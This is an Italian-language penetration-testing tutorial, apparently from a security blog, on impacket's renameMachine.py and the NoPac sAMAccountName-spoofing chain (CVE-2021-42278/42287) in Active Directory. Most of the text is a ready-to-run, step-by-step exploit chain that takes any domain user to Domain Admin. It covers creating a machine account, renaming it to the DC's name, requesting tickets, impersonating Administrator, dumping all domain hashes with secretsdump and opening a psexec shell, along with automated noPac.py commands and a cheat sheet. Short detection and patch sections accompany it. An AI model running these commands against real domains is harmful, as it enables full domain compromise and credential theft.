---
title: 'renameMachine.py: NoPac e sAMAccountName Spoofing'
slug: renamemachine
description: >-
  Guida a impacket-renameMachine per modificare il sAMAccountName dei computer
  account e comprendere la catena NoPac con CVE-2021-42278 e CVE-2021-42287.
image: /renamemachine-py-samaccountname-spoofing-nopac.webp
draft: false
date: 2026-08-01T00:00:00.000Z
categories:
  - tools
subcategories:
  - expoit
tags:
  - impacket
  - renamemachine
  - nopac
  - samaccountname-spoofing
  - active-directory
---

# renameMachine.py — Rinomina dei Computer Account e Attacco NoPac

`renameMachine.py` modifica l'attributo `sAMAccountName` di un computer account in AD. Da solo non fa niente di interessante. Combinato con CVE-2021-42278 e CVE-2021-42287, permette a qualsiasi utente di dominio di diventare Domain Admin sfruttando come il KDC gestisce i nomi degli account durante l'emissione dei ticket.

`renameMachine.py` fa parte di [Impacket](https://hackita.it/articoli/impacket/) ed è stato introdotto specificamente per la catena d'attacco nota come **NoPac** (o **sAMAccountName Spoofing**), documentata nell'articolo dedicato [NoPac](https://hackita.it/articoli/nopac/). Qui ci concentriamo sul funzionamento del tool e sul perché ogni step della catena è necessario.

***

## Il meccanismo — perché funziona

Per capire `renameMachine.py` devi capire il bug che sfrutta.

Quando il KDC (Domain Controller) riceve una richiesta AS-REQ, cerca l'account nel database AD in base al `sAMAccountName`. I computer account hanno il `sAMAccountName` che termina sempre con `$` (es. `WS01$`). I Domain Controller, invece, hanno nomi **senza** `$` nel `sAMAccountName` (es. `DC01`).

**CVE-2021-42278** — il problema: AD non impedisce di impostare il `sAMAccountName` di un computer account a un valore arbitrario, anche se corrisponde esattamente al nome di un DC senza il `$`. Quindi puoi rinominare il tuo computer account da `ATTACKER$` a `DC01`.

**CVE-2021-42287** — il colpo: quando richiedi un TGT come `DC01` (il tuo computer rinominato), il KDC lo emette normalmente. Poi rinomini il computer a un nome diverso. A questo punto, se presenti quel TGT per richiedere un Service Ticket via S4U2self, il KDC cerca `DC01` nel database, non lo trova come account normale, aggiunge automaticamente il `$` e trova `DC01$` — il vero Domain Controller. Emette il Service Ticket impersonando qualsiasi utente **verso il DC reale**.

```
ATTACKER$   →   rinomina sAMAccountName a "DC01"
              →   richiede TGT come "DC01" (TGT emesso per il tuo computer)
              →   rinomina sAMAccountName di nuovo a "ATTACKER$"
              →   presenta il TGT per S4U2self come "DC01"
              →   KDC cerca DC01, non trova, aggiunge $, trova DC01$
              →   emette ST come Administrator → DC01$
              →   hai un ticket valido come DA sul DC reale
```

***

## Sintassi e flag

```bash
impacket-renameMachine [opzioni] dominio/utente[:password]
```

| Flag                 | Descrizione                                 |
| -------------------- | ------------------------------------------- |
| `-current-name NOME` | Nome attuale del computer account (con `$`) |
| `-new-name NOME`     | Nuovo `sAMAccountName` da impostare         |
| `-dc-ip IP`          | IP del Domain Controller                    |
| `-dc-host HOST`      | FQDN del DC                                 |
| `-hashes LM:NT`      | Pass-the-Hash                               |
| `-k`                 | Kerberos                                    |
| `-no-pass`           | Con `-k`                                    |
| `-debug`             | Output verbose                              |

***

## Prerequisiti

```bash
# 1. MachineAccountQuota > 0 (di default è 10)
nxc ldap 10.10.10.5 -u user -p pass -M maq

# 2. Verifica se il DC è vulnerabile (non patchato)
nxc smb 10.10.10.5 -u user -p pass -M nopac
# oppure
python3 scanner.py corp.local/user:pass -dc-ip 10.10.10.5

# Il tool richiede di controllare il KDC senza patch per:
# KB5008102 (novembre 2021) → ha mitigato CVE-2021-42278
# KB5008380 (novembre 2021) → ha mitigato CVE-2021-42287
```

***

## Catena d'attacco completa — manuale step by step

Questo è il modo di eseguire NoPac a mano con i singoli tool Impacket. Capire ogni step è utile per debug e per capire cosa sta succedendo esattamente.

```bash
# STEP 1 — Crea un computer account che controlli
# (sfrutta MachineAccountQuota)
impacket-addcomputer corp.local/user:Password123 \
  -computer-name 'ATTACKER$' \
  -computer-pass 'AttackerPass123!' \
  -dc-ip 10.10.10.5
# → [*] Successfully added machine account ATTACKER$ with password AttackerPass123!

# STEP 2 — Rimuovi l'SPN del computer account
# (necessario perché il KDC verifica che il nome nell'AS-REQ non abbia SPN registrati)
impacket-addspn corp.local/user:Password123 \
  -u corp.local/'ATTACKER$' \
  -p 'AttackerPass123!' \
  -t 'ATTACKER$' \
  -c \
  -dc-ip 10.10.10.5

# STEP 3 — Rinomina il computer account al nome del DC (senza $)
impacket-renameMachine \
  -current-name 'ATTACKER$' \
  -new-name 'DC01' \
  -dc-ip 10.10.10.5 \
  corp.local/user:Password123
# → [*] Modifying attribute (sAMAccountName): ATTACKER$ → DC01
# → [*] New sAMAccountName does not end with '$' (attempting CVE-2021-42278)
# → [*] Target object modified successfully!

# STEP 4 — Richiedi un TGT come "DC01" usando le credenziali del tuo computer account
impacket-getTGT \
  -dc-ip 10.10.10.5 \
  corp.local/DC01:'AttackerPass123!'
# → [*] Saving ticket in DC01.ccache

# STEP 5 — Rinomina SUBITO il computer account al nome originale
# (il KDC deve NON trovare "DC01" quando fa la S4U2self lookup)
impacket-renameMachine \
  -current-name 'DC01' \
  -new-name 'ATTACKER$' \
  -dc-ip 10.10.10.5 \
  corp.local/user:Password123
# → [*] Target object modified successfully!

# STEP 6 — S4U2self: impersona Administrator usando il TGT ottenuto come DC01
export KRB5CCNAME=DC01.ccache

impacket-getST \
  -self \
  -impersonate 'Administrator' \
  -spn 'cifs/DC01.corp.local' \
  -k -no-pass \
  -dc-ip 10.10.10.5 \
  corp.local/DC01
# → [*] Getting ST for user
# → [*] Saving ticket in Administrator.ccache

# STEP 7 — Usa il ticket per accedere al DC come Administrator
export KRB5CCNAME=Administrator.ccache

# DCSync — dump tutti gli hash
impacket-secretsdump \
  -k -no-pass \
  -just-dc-ntlm \
  corp.local/Administrator@DC01.corp.local

# Shell come DA
impacket-psexec -k -no-pass \
  corp.local/Administrator@DC01.corp.local

# STEP 8 — Cleanup: elimina il computer account creato
impacket-addcomputer corp.local/user:Password123 \
  -computer-name 'ATTACKER$' \
  -dc-ip 10.10.10.5 \
  -delete
```

***

## Versione automatizzata — noPac.py

Se non ti interessa fare gli step a mano, esiste `noPac.py` che automatizza tutta la catena:

```bash
# Scan — verifica se vulnerabile
python3 noPac.py corp.local/user:Password123 \
  -dc-ip 10.10.10.5 -dc-host DC01 \
  --scan

# Exploit — shell diretta come Administrator
python3 noPac.py corp.local/user:Password123 \
  -dc-ip 10.10.10.5 -dc-host DC01 \
  -shell --impersonate administrator \
  -use-ldap

# DCSync
python3 noPac.py corp.local/user:Password123 \
  -dc-ip 10.10.10.5 -dc-host DC01 \
  --impersonate administrator \
  -dump -just-dc-user krbtgt

# Repo: https://github.com/Ridter/noPac
```

La versione manuale con `renameMachine.py` ti dà più controllo e ti aiuta a capire cosa succede quando un step fallisce. La versione automatizzata è più veloce ma meno trasparente.

***

## Perché il rename deve avvenire due volte

Un errore comune è non capire perché il `sAMAccountName` va rinominato **due volte** e in quale momento.

Il primo rename (da `ATTACKER$` a `DC01`) serve per far credere al KDC che stai richiedendo un TGT per l'account `DC01`. Il KDC non verifica che `DC01` corrisponda al DC reale — emette semplicemente il ticket per l'account che trova con quel nome.

Il secondo rename (da `DC01` a `ATTACKER$`) deve avvenire **prima** di S4U2self. Il motivo: quando presenti il TGT per richiedere il Service Ticket via S4U2self, il KDC cerca nel database un account chiamato `DC01`. Se trovasse il tuo computer rinominato, emetterebbe il ST per quello. Non trovandolo (perché l'hai rinominato), applica la logica di fallback del CVE-2021-42287 e aggiunge `$`, trovando il DC reale `DC01$` — e lì emette il ticket impersonando Administrator verso il DC vero.

***

## Detection

L'attacco genera una sequenza di eventi riconoscibile nei Windows Security Event Log:

| Event ID | Cosa indica                                                                          |
| -------- | ------------------------------------------------------------------------------------ |
| **4741** | Computer account creato (`ATTACKER$`)                                                |
| **4742** | Computer account modificato: `OldTargetUserName=ATTACKER$`, `NewTargetUserName=DC01` |
| **4768** | TGT richiesto per `DC01` (senza `$`)                                                 |
| **4742** | Computer account modificato di nuovo: `DC01` → `ATTACKER$`                           |
| **4769** | S4U2self: ST richiesto come Administrator verso cifs/DC01                            |

Il pattern chiave che gli SIEM cercano: Event ID 4742 dove il `NewTargetUserName` corrisponde al nome di un DC **senza** il `$` finale. Elastic Security, Microsoft Defender for Identity e Splunk hanno regole dedicate a questo pattern.

***

## Stato patch

Microsoft ha rilasciato le patch nel novembre 2021:

* **KB5008102** — mitiga CVE-2021-42278 (hardening su sAMAccountName)
* **KB5008380** — mitiga CVE-2021-42287 (PAC validation)

Su ambienti aggiornati l'attacco non funziona. Prima di tentarlo, verifica sempre con il modulo `nopac` di nxc o con il flag `--scan` di noPac.py.

***

## Cheat Sheet

```bash
# Rinomina computer account (CVE-2021-42278 - step 3)
impacket-renameMachine \
  -current-name 'ATTACKER$' \
  -new-name 'DC01' \
  -dc-ip DC_IP \
  corp.local/user:pass

# Ripristino dopo getTGT (step 5)
impacket-renameMachine \
  -current-name 'DC01' \
  -new-name 'ATTACKER$' \
  -dc-ip DC_IP \
  corp.local/user:pass

# Catena NoPac completa (manuale)
# 1. addcomputer   → crea ATTACKER$
# 2. addspn        → rimuovi SPN da ATTACKER$
# 3. renameMachine → ATTACKER$ → DC01
# 4. getTGT        → richiedi TGT come DC01
# 5. renameMachine → DC01 → ATTACKER$
# 6. getST -self   → S4U2self come Administrator → DC01
# 7. secretsdump   → dump hash dominio
# 8. addcomputer -delete → cleanup

# Automatizzato
python3 noPac.py corp.local/user:pass -dc-ip DC_IP -dc-host DC01 \
  -shell --impersonate administrator -use-ldap
```

**Articoli correlati:**

* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
* [NoPac: CVE-2021-42278 + CVE-2021-42287](https://hackita.it/articoli/nopac/)
* [addcomputer.py — crea computer account](https://hackita.it/articoli/addcomputer/)
* [getTGT.py — richiedi TGT con credenziali](https://hackita.it/articoli/gettgt/)
* [getST.py — S4U2self e delegation](https://hackita.it/articoli/getst/)
* [Active Directory: guida all'exploitation](https://hackita.it/articoli/active-directory/)

> Uso esclusivo in ambienti autorizzati.

\#impacket #active-directory #kerberos #CVE-2021-42278
